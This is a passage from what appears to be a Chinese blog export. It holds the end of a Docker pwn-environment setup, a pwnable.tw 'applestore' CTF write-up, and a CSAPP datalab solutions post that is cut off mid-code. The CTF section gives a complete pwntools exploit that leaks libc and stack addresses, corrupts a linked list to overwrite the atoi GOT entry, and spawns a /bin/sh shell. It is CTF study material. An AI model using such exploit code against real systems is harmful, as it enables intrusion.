<p>其中-v 后面的路径就是你自己的哪个文件夹要映射到容器里的哪个文件夹</p>
<p>在容器停止运行后，下次要继续在该容器中运行，可以按如下方法：</p>
<p>先获取到容器的id：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ docker ps -a</span><br></pre></td></tr></table></figure>

<p>获取到容器的id为：6121daf720c0</p>
<p>建立一个脚本，内容如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker container start 6121daf720c0</span><br><span class="line">docker exec -i -t 6121daf720c0 bash</span><br></pre></td></tr></table></figure>

<h2 id="0x05-附上自己的镜像地址"><a href="#0x05-附上自己的镜像地址" class="headerlink" title="0x05 附上自己的镜像地址"></a>0x05 附上自己的镜像地址</h2><p>2.31</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker pull registry.cn-hangzhou.aliyuncs.com/cooook/dockerpwn:v1</span><br></pre></td></tr></table></figure>

<p>2.29</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker pull wood1314/19pwn:v2</span><br></pre></td></tr></table></figure>

<p>2.27</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker pull registry.cn-hangzhou.aliyuncs.com/pwndocker/pwndocker-nocbtm:1.0</span><br></pre></td></tr></table></figure>

<h2 id="0x06-Reference"><a href="#0x06-Reference" class="headerlink" title="0x06 Reference"></a>0x06 Reference</h2><p><a href="https://e3pem.github.io/2019/04/19/%E6%9D%82%E9%A1%B9/%E5%9C%A8docker%E4%B8%AD%E6%90%AD%E5%BB%BApwn%E7%8E%AF%E5%A2%83/" target="_blank" rel="noopener">https://e3pem.github.io/2019/04/19/%E6%9D%82%E9%A1%B9/%E5%9C%A8docker%E4%B8%AD%E6%90%AD%E5%BB%BApwn%E7%8E%AF%E5%A2%83/</a></p>
]]></content>
      <categories>
        <category>环境配置</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable-tw applestore</title>
    <url>/year/01/24/cl7iordpr003a293f4c4bxdyy/</url>
    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>这道题我一开始一直以为是堆，然后也一直没找到堆溢出的漏洞，最后看了题解才知道原来是个栈，利用方式以前其实也做过，还是不能思维定式了。</p>
<a id="more"></a>

<h2 id="0x01-题目分析"><a href="#0x01-题目分析" class="headerlink" title="0x01 题目分析"></a>0x01 题目分析</h2><p><img src="/24/cl7iordpr003a293f4c4bxdyy/1.png" alt></p>
<p>可以看出主要有四个功能，大致实现就是用双向链表。结构是<code>name|money|fd|bk</code>这样子。</p>
<h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><p>在checkout函数里,到了7147可以获得一部iphone8，然而这个iphone8却是用栈加进去的。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">checkout</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [esp+10h] [ebp-28h]</span></span><br><span class="line">  <span class="keyword">char</span> *v2; <span class="comment">// [esp+18h] [ebp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [esp+1Ch] [ebp-1Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// [esp+2Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  v1 = cart();</span><br><span class="line">  <span class="keyword">if</span> ( v1 == <span class="number">7174</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"*: iPhone 8 - $1"</span>);</span><br><span class="line">    asprintf(&amp;v2, <span class="string">"%s"</span>, <span class="string">"iPhone 8"</span>);</span><br><span class="line">    v3 = <span class="number">1</span>;</span><br><span class="line">    insert((<span class="keyword">int</span>)&amp;v2);</span><br><span class="line">    v1 = <span class="number">7175</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Total: $%d\n"</span>, v1);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Want to checkout? Maybe next time!"</span>);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>虽然这里没有栈溢出，但是可以利用其它函数比如delete，或者cart来修改栈上的内容。</p>
<h3 id="泄露"><a href="#泄露" class="headerlink" title="泄露"></a>泄露</h3><ul>
<li><p>由上可以泄露出libc地址，也可以泄露出堆地址。</p>
</li>
<li><p>还通过libc中的environ来泄露栈地址。</p>
</li>
</ul>
<p>如何泄露栈地址？</p>
<ol>
<li><p>在libc中保存了一个函数叫_environ，存的是当前进程的环境变量</p>
</li>
<li><p>得到libc地址后，libc基址+_environ的偏移量=_environ的地址<br>在内存布局中，他们同属于一个段，开启ASLR之后相对位置不变，偏移量之和libc库有关</p>
</li>
<li><p>通过_environ的地址得到_environ的值，从而得到环境变量地址，环境变量保存在栈中，所以通过栈内的偏移量，可以访问栈中任意变量</p>
</li>
</ol>
<h3 id="修改双向链的fd-bk"><a href="#修改双向链的fd-bk" class="headerlink" title="修改双向链的fd bk"></a>修改双向链的fd bk</h3><ul>
<li>修改双向链表的fd bk可以在delete的过程中造成一个dwordshoot的攻击，也就相当于任意地址写四字节，然而想直接修改atoi的got表为system会出现段错误（没权限）</li>
<li>利用dwordshoot修改delete函数的ebp，改变handler函数中参数的位置(修改为atoi_got - 0x22)，这样my_read会直接读到atoi的got中，并且atoi_got可以往里面写。</li>
<li>最后仍然是利用linux的参数截断特点，输入system+‘；/bin/sh’ 获得shell</li>
</ul>
<h2 id="0x03-exp"><a href="#0x03-exp" class="headerlink" title="0x03 exp"></a>0x03 exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">d = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">0</span>:</span><br><span class="line">    p = process(<span class="string">"./applestore"</span>)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>)</span><br><span class="line">    <span class="keyword">if</span> d == <span class="number">1</span>:</span><br><span class="line">		gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">"chall.pwnable.tw"</span>, <span class="number">10104</span>)</span><br><span class="line">    libc = ELF(<span class="string">'./libc_32.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(num)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"&gt; "</span>, str(<span class="number">2</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">"Device Number&gt; "</span>, str(num))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(ans)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"&gt; "</span>, str(<span class="number">3</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">"Item Number&gt; "</span>, ans)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cart</span><span class="params">(ans)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"&gt; "</span>, str(<span class="number">4</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">"Let me check your cart. ok? (y/n) &gt; "</span>, ans)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkout</span><span class="params">(ans)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"&gt; "</span>, str(<span class="number">5</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">"Let me check your cart. ok? (y/n) &gt; "</span>, ans)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">	add(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>):</span><br><span class="line">	add(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">checkout(<span class="string">'y'</span>)</span><br><span class="line">elf = ELF(<span class="string">"./applestore"</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">got_atoi = elf.got[<span class="string">'atoi'</span>]</span><br><span class="line">payload = <span class="string">'ya'</span> + p32(got_atoi) + p32(<span class="number">0xdeadbeaf</span>) + p32(<span class="number">0</span>)</span><br><span class="line">cart(payload)</span><br><span class="line">p.recvuntil(<span class="string">"27: "</span>)</span><br><span class="line">libc_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">libc_base = libc_addr - libc.symbols[<span class="string">'atoi'</span>]</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">environ_libc = libc_base + libc.symbols[<span class="string">'environ'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"environ_libc -&gt; "</span> + hex(environ_libc)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc_addr -&gt; "</span> + hex(libc_addr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc_base -&gt; "</span> + hex(libc_base)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"system -&gt; "</span> + hex(system)</span><br><span class="line">payload = <span class="string">'ya'</span> + p32(environ_libc) + <span class="string">'a'</span>*(<span class="number">0xa</span> - <span class="number">2</span> - <span class="number">4</span>) + p32(<span class="number">0</span>)</span><br><span class="line">cart(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"27: "</span>)</span><br><span class="line">stack = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"stack -&gt; "</span> + hex(stack)</span><br><span class="line">payload = <span class="string">'27'</span> + p32(stack) + p32(<span class="number">0x12345678</span>)</span><br><span class="line">payload += p32(got_atoi + <span class="number">0x22</span>) + p32(stack - <span class="number">0x10c</span>)</span><br><span class="line">ebp_addr = stack - <span class="number">0x10c</span></span><br><span class="line">log.success(<span class="string">'ebp: '</span> + hex(ebp_addr))</span><br><span class="line">delete(payload)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.sendlineafter(<span class="string">"&gt; "</span>, p32(system) + <span class="string">"||/bin/sh"</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>pwn题writeup</category>
      </categories>
      <tags>
        <tag>rop</tag>
        <tag>pwnabletw</tag>
      </tags>
  </entry>
  <entry>
    <title>CSAPP Datalab</title>
    <url>/year/01/22/cl7iordoe000j293f4smumhv7/</url>
    <content><![CDATA[<p>CSAPP大概都过了一遍，但是很多东西不实践一下理解还是不到位，趁这个假期尽量把11个lab做一下。</p>
<a id="more"></a>
<h2 id="0x1-bitXor"><a href="#0x1-bitXor" class="headerlink" title="0x1 bitXor"></a>0x1 bitXor</h2><blockquote>
<p>只用位运算实现一个异或</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * bitXor - x^y using only ~ and &amp; </span></span><br><span class="line"><span class="comment"> *   Example: bitXor(4, 5) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ~ &amp;</span></span><br><span class="line"><span class="comment"> *   Max ops: 14</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bitXor</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> ~(~x&amp;~y)&amp;~(x&amp;y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p><code>~(x&amp;y)</code>是把x和y中同时为1的位置为0,<code>~(~x&amp;~y)</code>是把x和y同时为0的位置为0，其他位都是1，然后再把两个相与，组合一下。</p>
<h2 id="0x2-tmin"><a href="#0x2-tmin" class="headerlink" title="0x2 tmin"></a>0x2 tmin</h2><blockquote>
<p>返回补码中的最小值</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * tmin - return minimum two's complement integer </span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 4</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">tmin</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>&lt;&lt;<span class="number">31</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>根据补码的规则，只有符号位为1时，这个数最小为-2^31^。</p>
<h2 id="0x3-isTmax"><a href="#0x3-isTmax" class="headerlink" title="0x3 isTmax"></a>0x3 isTmax</h2><blockquote>
<p>返回1，如果输入的x是补码中的最大值</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * isTmax - returns 1 if x is the maximum, two's complement number,</span></span><br><span class="line"><span class="comment"> *     and 0 otherwise </span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | +</span></span><br><span class="line"><span class="comment"> *   Max ops: 10</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isTmax</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i = x + <span class="number">1</span>;</span><br><span class="line">  x = x + i;</span><br><span class="line">  x = ~x;</span><br><span class="line">  i = !i;</span><br><span class="line">  x = x + i;</span><br><span class="line">  <span class="keyword">return</span> !x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h2><p>首先补码的最大值就是符号位为0，其它位为1，我们要做的就是把这个数转化成0。这个数有个特点就是将这个数+1然后再加自己等于-1，然后再取反就等于0了，但是-1如此操作也可以得到同样的结果，所以在x = ~x后面几行就是为了排除这种情况。</p>
<h2 id="0x4-allOddBits"><a href="#0x4-allOddBits" class="headerlink" title="0x4 allOddBits"></a>0x4 allOddBits</h2><blockquote>
<p>如果所有奇数位都为1，就返回1</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * allOddBits - return 1 if all odd-numbered bits in word set to 1</span></span><br><span class="line"><span class="comment"> *   where bits are numbered from 0 (least significant) to 31 (most significant)</span></span><br><span class="line"><span class="comment"> *   Examples allOddBits(0xFFFFFFFD) = 0, allOddBits(0xAAAAAAAA) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 12</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">allOddBits</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> mask = <span class="number">0xaa</span> + (<span class="number">0xaa</span>&lt;&lt;<span class="number">8</span>);</span><br><span class="line">    mask += mask&lt;&lt;<span class="number">16</span>;</span><br><span class="line">    <span class="keyword">return</span> !((x&amp;mask)^mask);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * negate - return -x </span></span><br><span class="line"><span class="comment"> *   Example: negate(1) = -1.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 5</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>

<h3 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h3><p>构造出0xaaaaaaaa，然后相与保留该数所有奇数位上为1的位，最后再异或，如果全为0则满足条件。</p>
<h2 id="0x5-negate"><a href="#0x5-negate" class="headerlink" title="0x5 negate"></a>0x5 negate</h2><blockquote>
<p>返回它的负数</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * negate - return -x </span></span><br><span class="line"><span class="comment"> *   Example: negate(1) = -1.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 5</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">negate</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> ~x+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="思路-4"><a href="#思路-4" class="headerlink" title="思路"></a>思路</h3><p>思路，变负就是按位取反再+1.</p>
<h2 id="0x6-isAsciiDignit"><a href="#0x6-isAsciiDignit" class="headerlink" title="0x6 isAsciiDignit"></a>0x6 isAsciiDignit</h2><blockquote>
<p>判断输入的ascii值是否大于等于字符0的小于等于字符9的</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * isAsciiDigit - return 1 if 0x30 &lt;= x &lt;= 0x39 (ASCII codes for characters '0' to '9')</span></span><br><span class="line"><span class="comment"> *   Example: isAsciiDigit(0x35) = 1.</span></span><br><span class="line"><span class="comment"> *            isAsciiDigit(0x3a) = 0.</span></span><br><span class="line"><span class="comment"> *            isAsciiDigit(0x05) = 0.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 15</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isAsciiDigit</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> sign = <span class="number">1</span>&lt;&lt;<span class="number">31</span>;</span><br><span class="line">  <span class="keyword">int</span> lower = ~<span class="number">0x30</span>;</span><br><span class="line">  <span class="keyword">int</span> higher = ~(sign|<span class="number">0x39</span>);</span><br><span class="line">  lower = sign&amp;(lower+x+<span class="number">1</span>)&gt;&gt;<span class="number">31</span>;</span><br><span class="line">  higher = sign&amp;(higher+x)&gt;&gt;<span class="number">31</span>;</span><br><span class="line">  <span class="keyword">return</span> !(lower|higher);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="思路-5"><a href="#思路-5" class="headerlink" title="思路"></a>思路</h3><ul>
<li>lower是加上比0x30小会是负数的数字</li>
<li>higher是加上比0x39大的数会是负数的数字</li>
<li>最后看看lower和higher是否同时满足条件</li>
</ul>
<h2 id="0x7-conditional"><a href="#0x7-conditional" class="headerlink" title="0x7 conditional"></a>0x7 conditional</h2><blockquote>
<p>用位运算符实现三目运算</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * conditional - same as x ? y : z </span></span><br><span class="line"><span class="comment"> *   Example: conditional(2,4,5) = 4</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 16</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">conditional</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y, <span class="keyword">int</span> z)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i = !!x;</span><br><span class="line">  x = ~i+<span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> (x&amp;y)|(~x&amp;z);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="思路-6"><a href="#思路-6" class="headerlink" title="思路"></a>思路</h3><p>先把x转化成真值0或者1，然后注意0和1的特性，0取负以后还是0，1取负以后是-1也就是全1。最后用0和全1对y和z进行选择。</p>
<h2 id="0x8-isLessOrEqual"><a href="#0x8-isLessOrEqual" class="headerlink" title="0x8 isLessOrEqual"></a>0x8 isLessOrEqual</h2><blockquote>
<p>判断参数1是否小于等于参数2</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * isLessOrEqual - if x &lt;= y  then return 1, else return 0 </span></span><br><span class="line"><span class="comment"> *   Example: isLessOrEqual(4,5) = 1.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 24</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isLessOrEqual</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> negX = ~x + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">int</span> addX = negX + y;</span><br><span class="line">  <span class="keyword">int</span> checkSign = (addX&gt;&gt;<span class="number">31</span>)&amp;<span class="number">1</span>;</span><br><span class="line">  <span class="keyword">int</span> sign = <span class="number">1</span>&lt;&lt;<span class="number">31</span>;</span><br><span class="line">  <span class="keyword">int</span> xLeft = x&amp;sign;</span><br><span class="line">  <span class="keyword">int</span> yLeft = y&amp;sign;</span><br><span class="line">  <span class="keyword">int</span> same = xLeft ^ yLeft;</span><br><span class="line">  same = (same&gt;&gt;<span class="number">31</span>)&amp;<span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> ((!same)&amp;(!checkSign))|(same&amp;(xLeft&gt;&gt;<span class="number">31</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="思路-7"><a href="#思路-7" class="headerlink" title="思路"></a>思路</h3><p>分两种情况：</p>
<ol>
<li>x和y符号不一样，那么x如果是负号的话就可以返回1  </li>
<li>x和y符号一样，那么就看y-x的符号是正是负</li>
</ol>
<h2 id="0x9-logicalNeg"><a href="#0x9-logicalNeg" class="headerlink" title="0x9 logicalNeg"></a>0x9 logicalNeg</h2><blockquote>
<p>实现逻辑非</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * logicalNeg - implement the ! operator, using all of </span></span><br><span class="line"><span class="comment"> *              the legal operators except !</span></span><br><span class="line"><span class="comment"> *   Examples: logicalNeg(3) = 0, logicalNeg(0) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 12</span></span><br><span class="line"><span class="comment"> *   Rating: 4 </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">logicalNeg</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (((~x+<span class="number">1</span>)|x)&gt;&gt;<span class="number">31</span>) + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="思路-8"><a href="#思路-8" class="headerlink" title="思路"></a>思路</h3><p>还是利用0的特性，只有0和它的补码符号位相与为全零，其它的符号位都会为1。这里+1是考虑到了最小值的特点，它和它的补码符号位都为1。</p>
<h2 id="0x10-howManyBits"><a href="#0x10-howManyBits" class="headerlink" title="0x10 howManyBits"></a>0x10 howManyBits</h2><blockquote>
<p>该数最少用几个位的补码就可以表示</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* howManyBits - return the minimum number of bits required to represent x in</span></span><br><span class="line"><span class="comment"> *             two's complement</span></span><br><span class="line"><span class="comment"> *  Examples: howManyBits(12) = 5</span></span><br><span class="line"><span class="comment"> *            howManyBits(298) = 10</span></span><br><span class="line"><span class="comment"> *            howManyBits(-5) = 4</span></span><br><span class="line"><span class="comment"> *            howManyBits(0)  = 1</span></span><br><span class="line"><span class="comment"> *            howManyBits(-1) = 1</span></span><br><span class="line"><span class="comment"> *            howManyBits(0x80000000) = 32</span></span><br><span class="line"><span class="comment"> *  Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *  Max ops: 90</span></span><br><span class="line"><span class="comment"> *  Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">howManyBits</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> b16,b8,b4,b2,b1,b0;</span><br><span class="line">  <span class="keyword">int</span> sign = x&gt;&gt;<span class="number">31</span>;</span><br><span class="line">  x = (sign&amp;~x)|(~sign&amp;x);</span><br><span class="line"></span><br><span class="line">  b16 = !!(x&gt;&gt;<span class="number">16</span>)&lt;&lt;<span class="number">4</span>;</span><br><span class="line">  x = x&gt;&gt;b16;</span><br><span class="line">  b8 = !!(x&gt;&gt;<span class="number">8</span>)&lt;&lt;<span class="number">3</span>;</span><br><span class="line">  x = x&gt;&gt;b8;</span><br><span class="line">  b4 = !!(x&gt;&gt;<span class="number">4</span>)&lt;&lt;<span class="number">2</span>;</span><br><span class="line">  x = x&gt;&gt;b4;</span><br><span class="line">  b2 = !!(x&gt;&gt;<span class="number">2</span>)&lt;&lt;<span class="number">1</span>;</span><br><span class="line">  x = x&gt;&gt;b2;</span><br><span class="line">  b1 = !!(x&gt;&gt;<span class="number">1</span>);</span><br><span class="line">  x = x&gt;&gt;b1;</span><br><span class="line">  b0 = x;</span><br><span class="line">  <span class="keyword">return</span> b16+b8+b4+b2+b1+b0+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="思路-9"><a href="#思路-9" class="headerlink" title="思路"></a>思路</h3><ul>
<li>如果是一个正数，那么只要找到它最高的那个1，然后再加上一个符号位就行了</li>
<li>如果是一个负数，那么找到它最高位的0然后再加上一个符号位就行，因为从符号位往右到第一个0的1都没意义。</li>
<li>所以如果x是正数，则不变，如果x是负数就给x取反</li>
<li>然后依次缩小范围，返回结果。</li>
</ul>
<h2 id="浮点数简介"><a href="#浮点数简介" class="headerlink" title="浮点数简介"></a>浮点数简介</h2><p>IEEE 浮点标准用 V=(-1)^s^<em>M</em>2^E^的形式表示一个数</p>
<ul>
<li>符号, s 决定这个数是正数(s = 0)，还是负数(s = 1)</li>
<li>尾数 M 是一个二进制小数, 它的范围是 1 ~ 2-e，(标准化数)或者是0 ~ 1-e（非标准化数)</li>
<li>阶码 E 的作用是对浮点数加权</li>
</ul>
<p>单精度浮点格式 s=1位，E=8位，M=23位</p>
<p>双精度浮点格式 s=1位，E=11位, M=52位</p>
<h2 id="0x11-floatScale2"><a href="#0x11-floatScale2" class="headerlink" title="0x11 floatScale2"></a>0x11 floatScale2</h2><blockquote>
<p>求2乘一个浮点数</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//float</span></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * floatScale2 - Return bit-level equivalent of expression 2*f for</span></span><br><span class="line"><span class="comment"> *   floating point argument f.</span></span><br><span class="line"><span class="comment"> *   Both the argument and result are passed as unsigned int's, but</span></span><br><span class="line"><span class="comment"> *   they are to be interpreted as the bit-level representation of</span></span><br><span class="line"><span class="comment"> *   single-precision floating point values.</span></span><br><span class="line"><span class="comment"> *   When argument is NaN, return argument</span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span></span><br><span class="line"><span class="comment"> *   Max ops: 30</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">floatScale2</span><span class="params">(<span class="keyword">unsigned</span> uf)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> <span class="built_in">exp</span> = (uf&amp;<span class="number">0x7f800000</span>)&gt;&gt;<span class="number">23</span>;</span><br><span class="line">  <span class="keyword">int</span> sign = uf&amp;(<span class="number">1</span>&lt;&lt;<span class="number">31</span>);</span><br><span class="line">  <span class="keyword">if</span>(<span class="built_in">exp</span> == <span 